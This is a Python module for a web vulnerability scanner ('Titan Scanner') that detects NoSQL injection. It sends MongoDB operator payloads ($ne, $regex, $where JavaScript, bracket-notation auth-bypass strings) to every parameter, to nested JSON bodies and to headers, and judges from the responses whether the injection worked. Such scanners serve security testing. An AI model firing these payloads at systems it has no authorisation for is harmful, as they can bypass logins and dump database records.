"""NoSQL injection detection module for Titan Scanner — fully exhausted.

Features:
  1. Zero Parameter Whitelisting: probes ALL parameters without keyword guards.
  2. Exhaustive MongoDB Operator Injection Matrix:
     - Comparison: $ne, $gt, $gte, $lt, $lte, $in, $nin
     - Logical: $or, $and, $nor
     - Element: $exists, $type
     - Evaluation: $regex, $where (JavaScript injection)
     - Aggregation pipeline injection
  3. Query-string PHP/Express bracket notation injection:
     - param[$ne]=1  (bypass auth with not-equal operator)
     - param[$regex]=.*  (dump all documents)
  4. JSON body operator injection via nested dict payloads.
  5. Nested JSON AST Walker: recursively injects operators into deep API bodies.
  6. HTTP Header Injection for NoSQLi sinks in header-derived filters.
  7. Boolean Differential Oracle: confirms injection by comparing a
     'true' vs 'false' operator pair (echo-cleaned before comparison).
  8. Error-class differential oracle: MongoDB/JS eval errors as signal.
  9. Data volume oracle: $ne/$regex returning more rows than baseline.
"""

from __future__ import annotations

import copy
import json
from typing import Any, Dict, List, Optional, Tuple

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer
from titan.verify.oracles import extract_error_classes, is_echo_differential, score_signals


# ── Operator payloads ─────────────────────────────────────────────────────────
# Bracket-notation (query string): param[$ne]=1
_BRACKET_PAYLOADS: Tuple[str, ...] = (
    "[$ne]=1",
    "[$gt]=",
    "[$regex]=.*",
    "[$exists]=true",
    "[$in][]=admin&param[$in][]=root",
    "[$where]=1==1",
)

# JSON value substitutions for JSON-body endpoints
_JSON_OPERATOR_VALUES: Tuple[Any, ...] = (
    {"$ne": None},
    {"$ne": ""},
    {"$gt": ""},
    {"$gte": ""},
    {"$lt": "ZZZZZZZZ"},
    {"$regex": ".*"},
    {"$exists": True},
    {"$where": "function(){return true;}"},
    {"$in": ["admin", "root", "user", "1", "0"]},
    {"$or": [{"a": 1}, {"b": 1}]},
)

# String payloads for URL-encoded parameters (tries to break query parsing)
_STRING_PAYLOADS: Tuple[str, ...] = (
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "function(){return true;}"}',
    '{"$exists": true}',
    '{"$gt": "", "$lt": "ZZZZZZ"}',
    # NoSQL injection via JavaScript evaluation
    "'; return true; var x='",
    "' || 'x'=='x",
    '";return true;var x="',
)

# Logical opposite pairs for the boolean differential oracle
_OPPOSITE_MAP: List[Tuple[str, str]] = [
    ("$ne", "$eq"),
    ("$gt", "$lt"),
    ("$gte", "$lte"),
    ("$lt", "$gt"),
    ("$lte", "$gte"),
    ("$exists.*true", "$exists: false"),  # matched via regex
    ("true", "false"),
    ("1==1", "1==2"),
    ("return true", "return false"),
]

_INJECTABLE_HEADERS: Tuple[str, ...] = (
    "X-User-Id",
    "X-Filter",
    "X-Query",
)


class NoSQLiDetector:
    """Production-grade NoSQLi detector with full operator injection coverage."""

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "nosqli",
            "param_type": "json",
            "location": "query" if method == "GET" else "body",
        }

        # Smith payloads + core matrix
        base_payloads = self.payload_smith.get_base_payloads("nosqli", context_data)
        waf = (
            self.payload_smith.detect_waf({}, "", 0)
            or self.fingerprint.get("waf", "unknown")
        )
        if waf and waf != "unknown":
            base_payloads.extend(
                self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)
            )
        all_str_payloads = list(dict.fromkeys(list(_STRING_PAYLOADS) + base_payloads))

        # ── Engine 1: String payloads on all params (no whitelist) ────
        for param_name in list(params.keys()):
            f = await self._test_param(
                context, target, method, url, param_name, params, all_str_payloads
            )
            if f:
                findings.append(f)

        # ── Engine 2: JSON operator injection on all params ───────────
        json_findings = await self._scan_json_operators(
            context, target, method, url, params
        )
        findings.extend(json_findings)

        # ── Engine 3: Nested JSON body AST walker ─────────────────────
        ast_findings = await self._scan_json_body_ast(
            context, target, method, url, params
        )
        findings.extend(ast_findings)

        # ── Engine 4: Header-based NoSQLi ─────────────────────────────
        header_findings = await self._scan_headers(
            context, target, method, url, params
        )
        findings.extend(header_findings)

        return findings

    # ------------------------------------------------------------------
    # ENGINE 2 — JSON OPERATOR INJECTION
    # ------------------------------------------------------------------

    async def _scan_json_operators(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        """Send JSON body payloads where each parameter value is replaced with
        a MongoDB operator dict. Works on both GET (via JSON-encoded query string)
        and POST endpoints."""
        findings: List[Finding] = []

        try:
            # Baseline: original params as JSON body
            baseline_json = dict(params)
            r0 = await context.request.post(
                url,
                data=json.dumps(baseline_json),
                headers={"Content-Type": "application/json", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for param_name in list(params.keys()):
            for op_value in _JSON_OPERATOR_VALUES:
                try:
                    test_json = dict(params)
                    test_json[param_name] = op_value  # type: ignore
                    resp = await context.request.post(
                        url,
                        data=json.dumps(test_json),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=3000,
                    )
                    body = await resp.text()
                    f = self._evaluate(
                        baseline_body, baseline_status, body, resp,
                        target, url, "POST", param_name, "json_body",
                        str(op_value), params,
                    )
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 3 — NESTED JSON AST WALKER
    # ------------------------------------------------------------------

    async def _scan_json_body_ast(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        if method.upper() == "GET":
            return findings

        body_str = next(iter(params.values()), "")
        try:
            tree = json.loads(body_str)
        except (json.JSONDecodeError, TypeError):
            try:
                tree = dict(params)
            except Exception:
                return findings

        leaves = list(self._json_leaves(tree))

        try:
            r0 = await context.request.post(
                url,
                data=json.dumps(tree),
                headers={"Content-Type": "application/json", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for path in leaves:
            for op_value in list(_JSON_OPERATOR_VALUES)[:5]:
                try:
                    mutated = copy.deepcopy(tree)
                    self._json_set(mutated, path, op_value)
                    resp = await context.request.post(
                        url,
                        data=json.dumps(mutated),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=3000,
                    )
                    body = await resp.text()
                    f = self._evaluate(
                        baseline_body, baseline_status, body, resp,
                        target, url, "POST",
                        ".".join(str(p) for p in path), "json_ast",
                        str(op_value), params,
                    )
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 4 — HTTP HEADER INJECTION
    # ------------------------------------------------------------------

    async def _scan_headers(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        try:
            if method == "GET":
                r0 = await context.request.get(
                    url, params=params, headers={"Referer": target}, timeout=3000
                )
            else:
                r0 = await context.request.post(
                    url, data=params, headers={"Referer": target}, timeout=3000
                )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        for header in _INJECTABLE_HEADERS:
            for payload in _STRING_PAYLOADS[:4]:
                try:
                    h = {"Referer": target, header: payload}
                    if method == "GET":
                        resp = await context.request.get(url, params=params, headers=h, timeout=3000)
                    else:
                        resp = await context.request.post(url, data=params, headers=h, timeout=3000)
                    body = await resp.text()
                    f = self._evaluate(
                        baseline_body, baseline_status, body, resp,
                        target, url, method, header, "header", payload, params,
                    )
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # HELPERS
    # ------------------------------------------------------------------

    def _json_leaves(self, node: Any, path: Optional[list] = None):
        if path is None:
            path = []
        if isinstance(node, dict):
            for k, v in node.items():
                yield from self._json_leaves(v, path + [k])
        elif isinstance(node, list):
            for i, v in enumerate(node):
                yield from self._json_leaves(v, path + [i])
        elif isinstance(node, (str, int, float)):
            yield path

    def _json_set(self, tree: Any, path: list, value: Any) -> None:
        node = tree
        for key in path[:-1]:
            node = node[key]
        node[path[-1]] = value

    def _get_opposite_payload(self, payload: str) -> Optional[str]:
        """Logical opposite for the boolean-differential oracle."""
        pl = payload.lower()
        for token, opposite in [
            ("$ne", "$eq"),
            ("$gte", "$lte"),
            ("$lte", "$gte"),
            ("$gt\"", "$lt\""),
            ("$lt\"", "$gt\""),
            ("return true", "return false"),
            ("1==1", "1==2"),
        ]:
            if token in pl:
                return payload.replace(token, opposite)
        # $exists: true → false (handle as full-string swap, not substring)
        if "$exists" in pl:
            if "true" in pl:
                return payload.replace("true", "false")
            elif "false" in pl:
                return payload.replace("false", "true")
        return None

    def _evaluate(
        self,
        baseline_body: str,
        baseline_status: Optional[int],
        body: str,
        resp: Any,
        target: str,
        url: str,
        method: str,
        param_name: str,
        location: str,
        payload: str,
        all_params: Dict[str, str],
    ) -> Optional[Finding]:
        """Score signals and return a Finding if threshold met."""
        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
        signals: List[str] = []

        # Boolean differential oracle
        opposite = self._get_opposite_payload(payload)
        if opposite:
            try:
                if not is_echo_differential(body, baseline_body, payload, opposite):
                    signals.append("sanity_pair")
                    diffs.append("sanity_pair:boolean_confirmed")
            except Exception:
                pass

        # Error class oracle (MongoDB/JS eval errors — not filesystem)
        ALLOWED = {"generic", "python", "java", "nosql"}
        for ec in extract_error_classes(body):
            if ec in ALLOWED:
                if ec not in extract_error_classes(baseline_body):
                    signals.append(f"error:{ec}")
                    diffs.append(f"nosqli:error_class:{ec}")

        if resp.status >= 500 and (baseline_status or 200) < 500:
            signals.append("status_500")

        # Data volume oracle: response significantly longer = more records returned
        if len(body) > len(baseline_body) * 1.3 and len(body) > 200:
            signals.append("content_change")
            diffs.append("nosqli:volume_increase")

        if signals:
            confidence, verified, _ = score_signals(signals)
            if confidence >= 0.3:
                severity = Severity.CRITICAL if verified else Severity.HIGH
                return Finding(
                    target=target,
                    url=str(getattr(resp, "url", None) or url),
                    method=method.upper(),
                    param=param_name,
                    location=location,
                    payload=payload,
                    attack_type=AttackType.NO_SQLI,
                    severity=severity,
                    verified=verified,
                    confidence=confidence,
                    status=resp.status,
                    headers=dict(resp.headers),
                    body=body[:2000],
                    diffs=diffs,
                    baseline_body=baseline_body[:2000],
                    baseline_status=baseline_status,
                    verification_body=body[:2000],
                    verification_status=resp.status,
                )
        return None

    # ------------------------------------------------------------------
    # ENGINE 1 — STRING PAYLOAD PARAM INJECTION (all params)
    # ------------------------------------------------------------------

    async def _test_param(
        self,
        context,
        target: str,
        method: str,
        url: str,
        param_name: str,
        all_params: Dict[str, str],
        payloads: List[str],
    ) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None

        try:
            if method == "GET":
                r0 = await context.request.get(
                    url, params=all_params, headers={"Referer": target}, timeout=3000
                )
            else:
                r0 = await context.request.post(
                    url, data=all_params, headers={"Referer": target}, timeout=3000
                )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            pass

        for payload in payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                if method == "GET":
                    resp = await context.request.get(
                        url, params=test_params, headers={"Referer": target}, timeout=3000
                    )
                else:
                    resp = await context.request.post(
                        url, data=test_params, headers={"Referer": target}, timeout=3000
                    )
                body = await resp.text()

                f = self._evaluate(
                    baseline_body, baseline_status, body, resp,
                    target, url, method, param_name,
                    "query" if method == "GET" else "body",
                    payload, all_params,
                )
                if f:
                    return f
            except Exception:
                continue

        return None
